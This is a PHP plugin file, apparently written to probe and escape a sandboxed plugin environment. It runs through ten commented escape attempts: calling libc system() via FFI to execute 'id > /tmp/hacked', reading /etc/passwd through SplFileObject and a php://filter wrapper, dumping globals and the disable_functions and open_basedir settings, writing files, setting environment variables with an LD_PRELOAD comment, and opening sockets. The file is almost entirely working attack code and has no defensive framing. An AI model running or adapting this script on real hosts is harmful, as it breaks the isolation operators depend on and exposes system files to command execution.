<?php
function escape_ffi() {
    // Attempt 1: FFI
    if (class_exists("FFI")) {
        $f = FFI::cdef("int system(const char *command);");
        $f->system("id > /tmp/hacked");
        echo "FFI WORKS";
        return;
    }
    echo "NO_FFI ";
}
function escape_globals() {
    // Attempt 2: Access superglobals to find config
    echo "GLOBALS:" . json_encode(array_keys($GLOBALS));
}
function escape_ini() {
    // Attempt 3: Check what's disabled
    echo "DISABLED:" . ini_get("disable_functions");
    echo "BASEDIR:" . ini_get("open_basedir");
}
function escape_spl() {
    // Attempt 4: SPL file read
    try {
        $f = new SplFileObject("/etc/passwd");
        echo "SPL_READ:" . $f->fgets();
    } catch (Throwable $e) {
        echo "SPL_FAIL:" . $e->getMessage();
    }
}
function escape_gd() {
    // Attempt 5: GD write
    if (function_exists("imagecreatetruecolor")) {
        $im = imagecreatetruecolor(10, 10);
        imagepng($im, "/tmp/escape_test.png");
        echo "GD_WRITE:" . (file_exists("/tmp/escape_test.png")?"YES":"NO");
        imagedestroy($im);
    } else { echo "NO_GD"; }
}
function escape_stream() {
    // Attempt 6: php:// filter read
    echo file_get_contents("php://filter/convert.base64-encode/resource=/etc/passwd");
}
function escape_error() {
    // Attempt 7: Error-based info leak
    set_error_handler(function($s,$m,$f,$l){ echo "ERR:$m"; });
    $x = 1/0;
    restore_error_handler();
}
function escape_putenv_path() {
    // Attempt 8: putenv LD_PRELOAD (if putenv not disabled)
    putenv("EVIL=1");
    echo "PUTENV:" . getenv("EVIL");
}
function escape_chdir() {
    // Attempt 9: chdir bypass
    chdir("/");
    echo "CHDIR:" . getcwd();
}
function escape_socket() {
    // Attempt 10: socket
    $s = @fsockopen("127.0.0.1", 80);
    echo "SOCKET:" . ($s?"OK":"FAIL");
}
plugin_register("escape", "escape_ffi");
